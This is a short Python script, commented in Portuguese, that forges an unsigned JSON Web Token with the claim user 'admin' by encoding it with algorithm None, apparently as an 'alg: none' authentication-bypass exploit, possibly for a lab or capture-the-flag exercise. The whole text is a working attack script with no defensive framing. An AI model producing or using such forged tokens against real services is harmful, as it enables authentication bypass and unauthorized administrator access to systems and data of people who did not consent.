import jwt

# Cria o payload falso
payload = {
    "user": "admin"
}

# Cria o token sem assinatura
token = jwt.encode(payload, key=None, algorithm=None)

print(token)
